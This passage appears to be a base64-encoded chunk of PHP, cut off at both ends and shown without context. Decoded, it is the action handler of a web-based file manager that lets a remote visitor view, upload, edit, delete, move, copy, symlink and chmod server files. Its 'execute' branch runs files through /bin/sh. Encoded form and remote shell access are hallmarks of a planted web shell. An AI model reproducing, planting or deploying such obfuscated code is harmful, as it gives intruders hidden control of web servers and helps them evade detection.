Cn0NCg0KaWYgKCFlbXB0eSgkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10pKSB7DQoJaWYgKHN0cnRvbG93ZXIoc3Vic3RyKCRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXSwgMCwgNikpID09ICdhcGFjaGUnKSB7DQoJCSRhcGFjaGUgPSB0cnVlOw0KCX0gZWxzZSB7DQoJCSRhcGFjaGUgPSBmYWxzZTsNCgl9DQp9IGVsc2Ugew0KCSRhcGFjaGUgPSB0cnVlOw0KfQ0KDQpzd2l0Y2ggKCRhY3Rpb24pIHsNCg0KY2FzZSAndmlldyc6DQoNCglpZiAoaXNfc2NyaXB0KCRmaWxlKSkgew0KDQoJCS8qIGhpZ2hsaWdodF9maWxlIGlzIGEgbWVzcyEgKi8NCgkJb2Jfc3RhcnQoKTsNCgkJaGlnaGxpZ2h0X2ZpbGUoJGZpbGUpOw0KCQkkc3JjID0gZXJlZ19yZXBsYWNlKCc8Zm9udCBjb2xvcj0iKFteIl0qKSI+JywgJzxzcGFuIHN0eWxlPSJjb2xvcjogXDEiPicsIG9iX2dldF9jb250ZW50cygpKTsNCgkJJHNyYyA9IHN0cl9yZXBsYWNlKGFycmF5KCc8L2ZvbnQ+JywgIlwgIiwgIlwgIiksIGFycmF5KCc8L3NwYW4+JywgJycsICcnKSwgJHNyYyk7DQoJCW9iX2VuZF9jbGVhbigpOw0KCQlodG1sX2hlYWRlcigpOw0KCQllY2hvICc8aDIgc3R5bGU9InRleHQtYWxpZ246IGxlZnQ7IG1hcmdpbi1ib3R0b206IDAiPicgLiBodG1sKCRmaWxlKSAuICc8L2gyPg0KPGhyIC8+DQoNCjx0YWJsZT4NCjx0cj4NCjx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQ7IHZlcnRpY2FsLWFsaWduOiB0b3A7IGNvbG9yOiBncmF5OyBwYWRkaW5nLXJpZ2h0OiAzcHQ7IGJvcmRlci1yaWdodDogMXB4IHNvbGlkIGdyYXkiPg0KPHByZSBzdHlsZT0ibWFyZ2luLXRvcDogMCI+PGNvZGU+JzsNCg0KCQlmb3IgKCRpID0gMTsgJGkgPD0gc2l6ZW9mKGZpbGUoJGZpbGUpKTsgJGkrKykgZWNobyAiJGlcICI7DQoJCWVjaG8gJzwvY29kZT48L3ByZT4NCjwvdGQ+DQo8dGQgc3R5bGU9InRleHQtYWxpZ246IGxlZnQ7IHZlcnRpY2FsLWFsaWduOiB0b3A7IHBhZGRpbmctbGVmdDogM3B0Ij4NCjxwcmUgc3R5bGU9Im1hcmdpbi10b3A6IDAiPicgLiAkc3JjIC4gJzwvcHJlPg0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPic7DQoJCWh0bWxfZm9vdGVyKCk7DQoJfSBlbHNlIHsNCgkJaGVhZGVyKCdDb250ZW50LVR5cGU6ICcgLiBnZXRtaW1ldHlwZSgkZmlsZSkpOw0KCQloZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGZpbGVuYW1lPScgLiBiYXNlbmFtZSgkZmlsZSkpOw0KDQoJCXJlYWRmaWxlKCRmaWxlKTsNCgkJfQ0KCWJyZWFrOw0KY2FzZSAnZG93bmxvYWQnOg0KCWhlYWRlcignUHJhZ21hOiBwdWJsaWMnKTsNCgloZWFkZXIoJ0V4cGlyZXM6IDAnKTsNCgloZWFkZXIoJ0NhY2hlLUNvbnRyb2w6IG11c3QtcmV2YWxpZGF0ZSwgcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MCcpOw0KCWhlYWRlcignQ29udGVudC1UeXBlOiAnIC4gZ2V0bWltZXR5cGUoJGZpbGUpKTsNCgloZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPScgLiBiYXNlbmFtZSgkZmlsZSkgLiAnOycpOw0KCWhlYWRlcignQ29udGVudC1MZW5ndGg6ICcgLiBmaWxlc2l6ZSgkZmlsZSkpOw0KDQoJcmVhZGZpbGUoJGZpbGUpOw0KDQoJYnJlYWs7DQoNCmNhc2UgJ3VwbG9hZCc6DQoNCgkkZGVzdCA9IHJlbGF0aXZlMmFic29sdXRlKCRmaWxlWyduYW1lJ10sICRkaXJlY3RvcnkpOw0KDQoJaWYgKEBmaWxlX2V4aXN0cygkZGVzdCkpIHsNCgkJbGlzdGluZ19wYWdlKGVycm9yKCdhbHJlYWR5X2V4aXN0cycsICRkZXN0KSk7DQoJfSBlbHNlaWYgKEBtb3ZlX3VwbG9hZGVkX2ZpbGUoJGZpbGVbJ3RtcF9uYW1lJ10sICRkZXN0KSkgew0KCQlAY2htb2QoJGRlc3QsICRmaWxlcGVybWlzc2lvbik7DQoJCWxpc3RpbmdfcGFnZShub3RpY2UoJ3VwbG9hZGVkJywgJGZpbGVbJ25hbWUnXSkpOw0KCX0gZWxzZSB7DQoJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X3VwbG9hZGVkJywgJGZpbGVbJ25hbWUnXSkpOw0KCX0NCglicmVhazsNCg0KY2FzZSAnY3JlYXRlX2RpcmVjdG9yeSc6DQoNCglpZiAoQGZpbGVfZXhpc3RzKCRmaWxlKSkgew0KCQlsaXN0aW5nX3BhZ2UoZXJyb3IoJ2FscmVhZHlfZXhpc3RzJywgJGZpbGUpKTsNCgl9IGVsc2Ugew0KCQkkb2xkID0gQHVtYXNrKDA3NzcgJiB+JGRpcnBlcm1pc3Npb24pOw0KCQlpZiAoQG1rZGlyKCRmaWxlLCAkZGlycGVybWlzc2lvbikpIHsNCgkJCWxpc3RpbmdfcGFnZShub3RpY2UoJ2NyZWF0ZWQnLCAkZmlsZSkpOw0KCQl9IGVsc2Ugew0KCQkJbGlzdGluZ19wYWdlKGVycm9yKCdub3RfY3JlYXRlZCcsICRmaWxlKSk7DQoJCX0NCgkJQHVtYXNrKCRvbGQpOw0KCX0NCg0KCWJyZWFrOw0KDQpjYXNlICdjcmVhdGVfZmlsZSc6DQoNCglpZiAoQGZpbGVfZXhpc3RzKCRmaWxlKSkgew0KCQlsaXN0aW5nX3BhZ2UoZXJyb3IoJ2FscmVhZHlfZXhpc3RzJywgJGZpbGUpKTsNCgl9IGVsc2Ugew0KCQkkb2xkID0gQHVtYXNrKDA3NzcgJiB+JGZpbGVwZXJtaXNzaW9uKTsNCgkJaWYgKEB0b3VjaCgkZmlsZSkpIHsNCgkJCWVkaXQoJGZpbGUpOw0KCQl9IGVsc2Ugew0KCQkJbGlzdGluZ19wYWdlKGVycm9yKCdub3RfY3JlYXRlZCcsICRmaWxlKSk7DQoJCX0NCgkJQHVtYXNrKCRvbGQpOw0KCX0NCglicmVhazsNCmNhc2UgJ2V4ZWN1dGUnOg0KCWNoZGlyKGRpcm5hbWUoJGZpbGUpKTsNCgkkb3V0cHV0ID0gYXJyYXkoKTsNCgkkcmV0dmFsID0gMDsNCglleGVjKCdlY2hvICIuLycgLiBiYXNlbmFtZSgkZmlsZSkgLiAnIiB8IC9iaW4vc2gnLCAkb3V0cHV0LCAkcmV0dmFsKTsNCg0KCSRlcnJvciA9ICgkcmV0dmFsID09IDApID8gZmFsc2UgOiB0cnVlOw0KDQoJaWYgKHNpemVvZigkb3V0cHV0KSA9PSAwKSAkb3V0cHV0ID0gYXJyYXkoJzwnIC4gJHdvcmRzWydub19vdXRwdXQnXSAuICc+Jyk7DQoNCglpZiAoJGVycm9yKSB7DQoJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X2V4ZWN1dGVkJywgJGZpbGUsIGltcGxvZGUoIlwNCiIsICRvdXRwdXQpKSk7DQoJfSBlbHNlIHsNCgkJbGlzdGluZ19wYWdlKG5vdGljZSgnZXhlY3V0ZWQnLCAkZmlsZSwgaW1wbG9kZSgiXA0KIiwgJG91dHB1dCkpKTsNCgl9DQoJYnJlYWs7DQpjYXNlICdkZWxldGUnOg0KCWlmICghZW1wdHkoJF9QT1NUWydubyddKSkgew0KCQlsaXN0aW5nX3BhZ2UoKTsNCgl9IGVsc2VpZiAoIWVtcHR5KCRfUE9TVFsneWVzJ10pKSB7DQoNCgkJJGZhaWx1cmUgPSBhcnJheSgpOw0KCQkkc3VjY2VzcyA9IGFycmF5KCk7DQoNCgkJZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQoJCQlpZiAoZGVsKCRmaWxlKSkgew0KCQkJCSRzdWNjZXNzW10gPSAkZmlsZTsNCgkJCX0gZWxzZSB7DQoJCQkJJGZhaWx1cmVbXSA9ICRmaWxlOw0KCQkJfQ0KCQl9DQoJCSRtZXNzYWdlID0gJyc7DQoJCWlmIChzaXplb2YoJGZhaWx1cmUpID4gMCkgew0KCQkJJG1lc3NhZ2UgPSBlcnJvcignbm90X2RlbGV0ZWQnLCBpbXBsb2RlKCJcDQoiLCAkZmFpbHVyZSkpOw0KCQl9DQoJCWlmIChzaXplb2YoJHN1Y2Nlc3MpID4gMCkgew0KCQkJJG1lc3NhZ2UgLj0gbm90aWNlKCdkZWxldGVkJywgaW1wbG9kZSgiXA0KIiwgJHN1Y2Nlc3MpKTsNCgkJfQ0KCQlsaXN0aW5nX3BhZ2UoJG1lc3NhZ2UpOw0KDQoJfSBlbHNlIHsNCg0KCQlodG1sX2hlYWRlcigpOw0KDQoJCWVjaG8gJzxmb3JtIGFjdGlvbj0iJyAuICRzZWxmIC4gJyIgbWV0aG9kPSJwb3N0Ij4NCjx0YWJsZSBjbGFzcz0iZGlhbG9nIj4NCjx0cj4NCjx0ZCBjbGFzcz0iZGlhbG9nIj4nOw0KCQlyZXF1ZXN0X2R1bXAoKTsNCgkJZWNobyAiXHQ8Yj4iIC4gd29yZCgncmVhbGx5X2RlbGV0ZScpIC4gJzwvYj48cD4nOw0KCQlmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCWVjaG8gIlx0IiAuIGh0bWwoJGZpbGUpIC4gIjxiciAvPiI7DQoJCX0NCgkJZWNobyAnCTwvcD4NCgk8aHIgLz4NCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJubyIgdmFsdWU9IicgLiB3b3JkKCdubycpIC4gJyIgaWQ9InJlZF9idXR0b24iIC8+DQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ieWVzIiB2YWx1ZT0iJyAuIHdvcmQoJ3llcycpIC4gJyIgaWQ9ImdyZWVuX2J1dHRvbiIgc3R5bGU9Im1hcmdpbi1sZWZ0OiA1MHB4IiAvPg0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPC9mb3JtPic7DQoJCWh0bWxfZm9vdGVyKCk7DQoJfQ0KCWJyZWFrOw0KY2FzZSAncmVuYW1lJzoNCglpZiAoIWVtcHR5KCRfUE9TVFsnZGVzdGluYXRpb24nXSkpIHsNCgkJJGRlc3QgPSByZWxhdGl2ZTJhYnNvbHV0ZSgkX1BPU1RbJ2Rlc3RpbmF0aW9uJ10sICRkaXJlY3RvcnkpOw0KCQlpZiAoIUBmaWxlX2V4aXN0cygkZGVzdCkgJiYgQHJlbmFtZSgkZmlsZSwgJGRlc3QpKSB7DQoJCQlsaXN0aW5nX3BhZ2Uobm90aWNlKCdyZW5hbWVkJywgJGZpbGUsICRkZXN0KSk7DQoJCX0gZWxzZSB7DQoJCQlsaXN0aW5nX3BhZ2UoZXJyb3IoJ25vdF9yZW5hbWVkJywgJGZpbGUsICRkZXN0KSk7DQoJCX0NCgl9IGVsc2Ugew0KCQkkbmFtZSA9IGJhc2VuYW1lKCRmaWxlKTsNCgkJaHRtbF9oZWFkZXIoKTsNCgkJZWNobyAnPGZvcm0gYWN0aW9uPSInIC4gJHNlbGYgLiAnIiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGNsYXNzPSJkaWFsb2ciPg0KPHRyPg0KPHRkIGNsYXNzPSJkaWFsb2ciPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InJlbmFtZSIgLz4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJyAuIGh0bWwoJGZpbGUpIC4gJyIgLz4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkaXIiIHZhbHVlPSInIC4gaHRtbCgkZGlyZWN0b3J5KSAuICciIC8+DQoJPGI+JyAuIHdvcmQoJ3JlbmFtZV9maWxlJykgLiAnPC9iPg0KCTxwPicgLiBodG1sKCRmaWxlKSAuICc8L3A+DQoJPGI+JyAuIHN1YnN0cigkZmlsZSwgMCwgc3RybGVuKCRmaWxlKSAtIHN0cmxlbigkbmFtZSkpIC4gJzwvYj4NCgk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZGVzdGluYXRpb24iIHNpemU9IicgLiB0ZXh0ZmllbGRzaXplKCRuYW1lKSAuICciIHZhbHVlPSInIC4gaHRtbCgkbmFtZSkgLiAnIiAvPg0KCTxociAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSInIC4gd29yZCgncmVuYW1lJykgLiAnIiAvPg0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPHA+PGEgaHJlZj0iJyAuICRzZWxmIC4gJz9kaXI9JyAuIHVybGVuY29kZSgkZGlyZWN0b3J5KSAuICciPlsgJyAuIHdvcmQoJ2JhY2snKSAuICcgXTwvYT48L3A+DQo8L2Zvcm0+JzsNCgkJaHRtbF9mb290ZXIoKTsNCgl9DQoJYnJlYWs7DQoNCmNhc2UgJ21vdmUnOg0KCWlmICghZW1wdHkoJF9QT1NUWydkZXN0aW5hdGlvbiddKSkgew0KDQoJCSRkZXN0ID0gcmVsYXRpdmUyYWJzb2x1dGUoJF9QT1NUWydkZXN0aW5hdGlvbiddLCAkZGlyZWN0b3J5KTsNCg0KCQkkZmFpbHVyZSA9IGFycmF5KCk7DQoJCSRzdWNjZXNzID0gYXJyYXkoKTsNCg0KCQlmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCSRmaWxlbmFtZSA9IHN1YnN0cigkZmlsZSwgc3RybGVuKCRkaXJlY3RvcnkpKTsNCgkJCSRkID0gJGRlc3QgLiAkZmlsZW5hbWU7DQoJCQlpZiAoIUBmaWxlX2V4aXN0cygkZCkgJiYgQHJlbmFtZSgkZmlsZSwgJGQpKSB7DQoJCQkJJHN1Y2Nlc3NbXSA9ICRmaWxlOw0KCQkJfSBlbHNlIHsNCgkJCQkkZmFpbHVyZVtdID0gJGZpbGU7DQoJCQl9DQoJCX0NCgkJJG1lc3NhZ2UgPSAnJzsNCgkJaWYgKHNpemVvZigkZmFpbHVyZSkgPiAwKSB7DQoJCQkkbWVzc2FnZSA9IGVycm9yKCdub3RfbW92ZWQnLCBpbXBsb2RlKCJcDQoiLCAkZmFpbHVyZSksICRkZXN0KTsNCgkJfQ0KCQlpZiAoc2l6ZW9mKCRzdWNjZXNzKSA+IDApIHsNCgkJCSRtZXNzYWdlIC49IG5vdGljZSgnbW92ZWQnLCBpbXBsb2RlKCJcDQoiLCAkc3VjY2VzcyksICRkZXN0KTsNCgkJfQ0KCQlsaXN0aW5nX3BhZ2UoJG1lc3NhZ2UpOw0KDQoJfSBlbHNlIHsNCg0KCQlodG1sX2hlYWRlcigpOw0KDQoJCWVjaG8gJzxmb3JtIGFjdGlvbj0iJyAuICRzZWxmIC4gJyIgbWV0aG9kPSJwb3N0Ij4NCg0KPHRhYmxlIGNsYXNzPSJkaWFsb2ciPg0KPHRyPg0KPHRkIGNsYXNzPSJkaWFsb2ciPic7DQoJCXJlcXVlc3RfZHVtcCgpOw0KCQllY2hvICJcdDxiPiIgLiB3b3JkKCdtb3ZlX2ZpbGVzJykgLiAnPC9iPg0KCTxwPic7DQoJCWZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgew0KCQkJZWNobyAiXHQiIC4gaHRtbCgkZmlsZSkgLiAiPGJyIC8+IjsNCgkJfQ0KCQllY2hvICcJPC9wPg0KCTxociAvPg0KCScgLiB3b3JkKCdkZXN0aW5hdGlvbicpIC4gJzoNCgk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZGVzdGluYXRpb24iIHNpemU9IicgLiB0ZXh0ZmllbGRzaXplKCRkaXJlY3RvcnkpIC4gJyIgdmFsdWU9IicgLiBodG1sKCRkaXJlY3RvcnkpIC4gJyIgLz4NCgk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iJyAuIHdvcmQoJ21vdmUnKSAuICciIC8+DQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8cD48YSBocmVmPSInIC4gJHNlbGYgLiAnP2Rpcj0nIC4gdXJsZW5jb2RlKCRkaXJlY3RvcnkpIC4gJyI+WyAnIC4gd29yZCgnYmFjaycpIC4gJyBdPC9hPjwvcD4NCjwvZm9ybT4nOw0KCQlodG1sX2Zvb3RlcigpOw0KCX0NCglicmVhazsNCmNhc2UgJ2NvcHknOg0KCWlmICghZW1wdHkoJF9QT1NUWydkZXN0aW5hdGlvbiddKSkgew0KDQoJCSRkZXN0ID0gcmVsYXRpdmUyYWJzb2x1dGUoJF9QT1NUWydkZXN0aW5hdGlvbiddLCAkZGlyZWN0b3J5KTsNCgkJaWYgKEBpc19kaXIoJGRlc3QpKSB7DQoJCQkkZmFpbHVyZSA9IGFycmF5KCk7DQoJCQkkc3VjY2VzcyA9IGFycmF5KCk7DQoJCQlmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCQkkZmlsZW5hbWUgPSBzdWJzdHIoJGZpbGUsIHN0cmxlbigkZGlyZWN0b3J5KSk7DQoJCQkJJGQgPSBhZGRzbGFzaCgkZGVzdCkgLiAkZmlsZW5hbWU7DQoJCQkJaWYgKCFAaXNfZGlyKCRmaWxlKSAmJiAhQGZpbGVfZXhpc3RzKCRkKSAmJiBAY29weSgkZmlsZSwgJGQpKSB7DQoJCQkJCSRzdWNjZXNzW10gPSAkZmlsZTsNCgkJCQl9IGVsc2Ugew0KCQkJCQkkZmFpbHVyZVtdID0gJGZpbGU7DQoJCQkJfQ0KCQkJfQ0KCQkJJG1lc3NhZ2UgPSAnJzsNCgkJCWlmIChzaXplb2YoJGZhaWx1cmUpID4gMCkgew0KCQkJCSRtZXNzYWdlID0gZXJyb3IoJ25vdF9jb3BpZWQnLCBpbXBsb2RlKCJcICIsICRmYWlsdXJlKSwgJGRlc3QpOw0KCQkJfQ0KCQkJaWYgKHNpemVvZigkc3VjY2VzcykgPiAwKSB7DQoJCQkJJG1lc3NhZ2UgLj0gbm90aWNlKCdjb3BpZWQnLCBpbXBsb2RlKCJcDQoiLCAkc3VjY2VzcyksICRkZXN0KTsNCgkJCX0NCgkJCWxpc3RpbmdfcGFnZSgkbWVzc2FnZSk7DQoJCX0gZWxzZSB7DQoNCgkJCWlmICghQGZpbGVfZXhpc3RzKCRkZXN0KSAmJiBAY29weSgkZmlsZSwgJGRlc3QpKSB7DQoJCQkJbGlzdGluZ19wYWdlKG5vdGljZSgnY29waWVkJywgJGZpbGUsICRkZXN0KSk7DQoJCQl9IGVsc2Ugew0KCQkJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X2NvcGllZCcsICRmaWxlLCAkZGVzdCkpOw0KCQkJfQ0KCQl9DQoJfSBlbHNlIHsNCgkJaHRtbF9oZWFkZXIoKTsNCgkJZWNobyAnPGZvcm0gYWN0aW9uPSInIC4gJHNlbGYgLiAnIiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGNsYXNzPSJkaWFsb2ciPg0KPHRyPg0KPHRkIGNsYXNzPSJkaWFsb2ciPic7DQoJCXJlcXVlc3RfZHVtcCgpOw0KCQllY2hvICJcDQo8Yj4iIC4gd29yZCgnY29weV9maWxlcycpIC4gJzwvYj4NCgk8cD4nOw0KCQlmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCWVjaG8gIlx0IiAuIGh0bWwoJGZpbGUpIC4gIjxiciAvPiI7DQoJCX0NCgkJZWNobyAnCTwvcD4NCgk8aHIgLz4NCgknIC4gd29yZCgnZGVzdGluYXRpb24nKSAuICc6DQoJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImRlc3RpbmF0aW9uIiBzaXplPSInIC4gdGV4dGZpZWxkc2l6ZSgkZGlyZWN0b3J5KSAuICciIHZhbHVlPSInIC4gaHRtbCgkZGlyZWN0b3J5KSAuICciIC8+DQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IicgLiB3b3JkKCdjb3B5JykgLiAnIiAvPg0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPHA+PGEgaHJlZj0iJyAuICRzZWxmIC4gJz9kaXI9JyAuIHVybGVuY29kZSgkZGlyZWN0b3J5KSAuICciPlsgJyAuIHdvcmQoJ2JhY2snKSAuICcgXTwvYT48L3A+DQo8L2Zvcm0+JzsNCgkJaHRtbF9mb290ZXIoKTsNCgl9DQoJYnJlYWs7DQpjYXNlICdjcmVhdGVfc3ltbGluayc6DQoJaWYgKCFlbXB0eSgkX1BPU1RbJ2Rlc3RpbmF0aW9uJ10pKSB7DQoJCSRkZXN0ID0gcmVsYXRpdmUyYWJzb2x1dGUoJF9QT1NUWydkZXN0aW5hdGlvbiddLCAkZGlyZWN0b3J5KTsNCgkJaWYgKHN1YnN0cigkZGVzdCwgLTEsIDEpID09ICRkZWxpbSkgJGRlc3QgLj0gYmFzZW5hbWUoJGZpbGUpOw0KCQlpZiAoIWVtcHR5KCRfUE9TVFsncmVsYXRpdmUnXSkpICRmaWxlID0gYWJzb2x1dGUycmVsYXRpdmUoYWRkc2xhc2goZGlybmFtZSgkZGVzdCkpLCAkZmlsZSk7DQoJCWlmICghQGZpbGVfZXhpc3RzKCRkZXN0KSAmJiBAc3ltbGluaygkZmlsZSwgJGRlc3QpKSB7DQoJCQlsaXN0aW5nX3BhZ2Uobm90aWNlKCdzeW1saW5rZWQnLCAkZmlsZSwgJGRlc3QpKTsNCgkJfSBlbHNlIHsNCgkJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X3N5bWxpbmtlZCcsICRmaWxlLCAkZGVzdCkpOw0KCQl9DQoJfSBlbHNlIHsNCgkJaHRtbF9oZWFkZXIoKTsNCgkJZWNobyAnPGZvcm0gYWN0aW9uPSInIC4gJHNlbGYgLiAnIiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGNsYXNzPSJkaWFsb2ciIGlkPSJzeW1saW5rIj4NCjx0cj4NCgk8dGQgc3R5bGU9InZlcnRpY2FsLWFsaWduOiB0b3AiPicgLiB3b3JkKCdkZXN0aW5hdGlvbicpIC4gJzogPC90ZD4NCgk8dGQ+DQoJCTxiPicgLiBodG1sKCRmaWxlKSAuICc8L2I+PGJyIC8+DQoJCTxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0icmVsYXRpdmUiIHZhbHVlPSJ5ZXMiIGlkPSJjaGVja2JveF9yZWxhdGl2ZSIgY2hlY2tlZD0iY2hlY2tlZCIgc3R5bGU9Im1hcmdpbi10b3A6IDFleCIgLz4NCgkJPGxhYmVsIGZvcj0iY2hlY2tib3hfcmVsYXRpdmUiPicgLiB3b3JkKCdyZWxhdGl2ZScpIC4gJzwvbGFiZWw+DQoJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9ImNyZWF0ZV9zeW1saW5rIiAvPg0KCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJyAuIGh0bWwoJGZpbGUpIC4gJyIgLz4NCgkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZGlyIiB2YWx1ZT0iJyAuIGh0bWwoJGRpcmVjdG9yeSkgLiAnIiAvPg0KCTwvdGQ+PC90cj48dHI+DQoJPHRkPicgLiB3b3JkKCdzeW1saW5rJykgLiAnOiA8L3RkPjx0ZD4NCgkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImRlc3RpbmF0aW9uIiBzaXplPSInIC4gdGV4dGZpZWxkc2l6ZSgkZGlyZWN0b3J5KSAuICciIHZhbHVlPSInIC4gaHRtbCgkZGlyZWN0b3J5KSAuICciIC8+DQoJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSInIC4gd29yZCgnY3JlYXRlX3N5bWxpbmsnKSAuICciIC8+DQoJPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPHA+PGEgaHJlZj0iJyAuICRzZWxmIC4gJz9kaXI9JyAuIHVybGVuY29kZSgkZGlyZWN0b3J5KSAuICciPlsgJyAuIHdvcmQoJ2JhY2snKSAuICcgXTwvYT48L3A+DQo8L2Zvcm0+JzsNCgkJaHRtbF9mb290ZXIoKTsNCgl9DQoJYnJlYWs7DQoNCmNhc2UgJ2VkaXQnOg0KDQoJaWYgKCFlbXB0eSgkX1BPU1RbJ3NhdmUnXSkpIHsNCg0KCQkkY29udGVudCA9IHN0cl9yZXBsYWNlKCJcIFwgIiwgIlwgIiwgJF9QT1NUWydjb250ZW50J10pOw0KDQoJCWlmICgoJGYgPSBAZm9wZW4oJGZpbGUsICd3JykpICYmIEBmd3JpdGUoJGYsICRjb250ZW50KSAhPT0gZmFsc2UgJiYgQGZjbG9zZSgkZikpIHsNCgkJCWxpc3RpbmdfcGFnZShub3RpY2UoJ3NhdmVkJywgJGZpbGUpKTsNCgkJfSBlbHNlIHsNCgkJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X3NhdmVkJywgJGZpbGUpKTsNCgkJfQ0KDQoJfSBlbHNlIHsNCg0KCQlpZiAoQGlzX3JlYWRhYmxlKCRmaWxlKSAmJiBAaXNfd3JpdGFibGUoJGZpbGUpKSB7DQoJCQllZGl0KCRmaWxlKTsNCgkJfSBlbHNlIHsNCgkJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X2VkaXRlZCcsICRmaWxlKSk7DQoJCX0NCgl9DQoNCglicmVhazsNCg0KY2FzZSAncGVybWlzc2lvbic6DQoNCglpZiAoIWVtcHR5KCRfUE9TVFsnc2V0J10pKSB7DQoNCgkJJG1vZGUgPSAwOw0KCQlpZiAoIWVtcHR5KCRfUE9TVFsndXInXSkpICRtb2RlIHw9IDA0MDA7IGlmICghZW1wdHkoJF9QT1NUWyd1dyddKSkgJG1vZGUgfD0gMDIwMDsgaWYgKCFlbXB0eSgkX1BPU1RbJ3V4J10pKSAkbW9kZSB8PSAwMTAwOw0KCQlpZiAoIWVtcHR5KCRfUE9TVFsnZ3InXSkpICRtb2RlIHw9IDAwNDA7IGlmICghZW1wdHkoJF9QT1NUWydndyddKSkgJG1vZGUgfD0gMDAyMDsgaWYgKCFlbXB0eSgkX1BPU1RbJ2d4J10pKSAkbW9kZSB8PSAwMDEwOw0KCQlpZiAoIWVtcHR5KCRfUE9TVFsnb3InXSkpICRtb2RlIHw9IDAwMDQ7IGlmICghZW1wdHkoJF9QT1NUWydvdyddKSkgJG1vZGUgfD0gMDAwMjsgaWYgKCFlbXB0eSgkX1BPU1RbJ294J10pKSAkbW9kZSB8PSAwMDAxOw0KDQoJCWlmIChAY2htb2QoJGZpbGUsICRtb2RlKSkgew0KCQkJbGlzdGluZ19wYWdlKG5vdGljZSgncGVybWlzc2lvbl9zZXQnLCAkZmlsZSwgZGVjb2N0KCRtb2RlKSkpOw0KCQl9IGVsc2Ugew0KCQkJbGlzdGluZ19wYWdlKGVycm9yKCdwZXJtaXNzaW9uX25vdF9zZXQnLCAkZmlsZSwgZGVjb2N0KCRtb2RlKSkpOw0KCQl9DQoJfSBlbHNlIHsNCg0KCQlodG1sX2hlYWRlcigpOw0KDQoJCSRtb2RlID0gZmlsZXBlcm1zKCRmaWxlKTsNCg0KCQllY2hvICc8Zm9ybSBhY3Rpb249IicgLiAkc2VsZiAuICciIG1ldGhvZD0icG9zdCI+DQoNCjx0YWJsZSBjbGFzcz0iZGlhbG9nIj4NCjx0cj4NCjx0ZCBjbGFzcz0iZGlhbG9nIj4NCgk8cCBzdHlsZT0ibWFyZ2luOiAwIj4nIC4gcGhyYXNlKCdwZXJtaXNzaW9uX2ZvcicsICRmaWxlKSAuICc8L3A+DQoNCgk8aHIgLz4NCg0KCTx0YWJsZSBpZD0icGVybWlzc2lvbiI+DQoJPHRyPg0KCQk8dGQ+PC90ZD4NCgkJPHRkIHN0eWxlPSJib3JkZXItcmlnaHQ6IDFweCBzb2xpZCBibGFjayI+JyAuIHdvcmQoJ293bmVyJykgLiAnPC90ZD4NCgkJPHRkIHN0eWxlPSJib3JkZXItcmlnaHQ6IDFweCBzb2xpZCBibGFjayI+JyAuIHdvcmQoJ2dyb3VwJykgLiAnPC90ZD4NCgkJPHRkPicgLiB3b3JkKCdvdGhlcicpIC4gJzwvdGQ+DQoJPC90cj4NCgk8dHI+DQoJCTx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPicgLiB3b3JkKCdyZWFkJykgLiAnOjwvdGQ+DQoJCTx0ZD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InVyIiB2YWx1ZT0iMSInOyBpZiAoJG1vZGUgJiAwMDQwMCkgZWNobyAnIGNoZWNrZWQ9ImNoZWNrZWQiJzsgZWNobyAnIC8+PC90ZD4NCgkJPHRkPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iZ3IiIHZhbHVlPSIxIic7IGlmICgkbW9kZSAmIDAwMDQwKSBlY2hvICcgY2hlY2tlZD0iY2hlY2tlZCInOyBlY2hvICcgLz48L3RkPg0KCQk8dGQ+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBu